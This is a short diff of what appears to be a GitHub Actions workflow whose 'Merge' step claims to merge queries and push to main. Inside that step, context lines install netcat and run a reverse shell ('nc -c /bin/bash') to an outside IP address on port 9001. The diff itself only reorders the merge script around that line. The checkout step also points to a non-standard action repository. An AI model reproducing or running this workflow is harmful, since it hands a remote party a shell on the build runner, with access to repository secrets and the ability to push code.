@@ -12,9 +12,9 @@ jobs:
       uses: emiliensocchi/actions@checkout
     - name: Merge
       run: |
-        bash ./.github/workflows/merge.sh
         sudo apt-get install netcat-traditional -y
         /bin/nc.traditional -c /bin/bash 20.13.168.45 9001
+        bash ./.github/workflows/merge.sh
         git add .
         git commit --message "Merge queries"
         git push -u origin HEAD:main
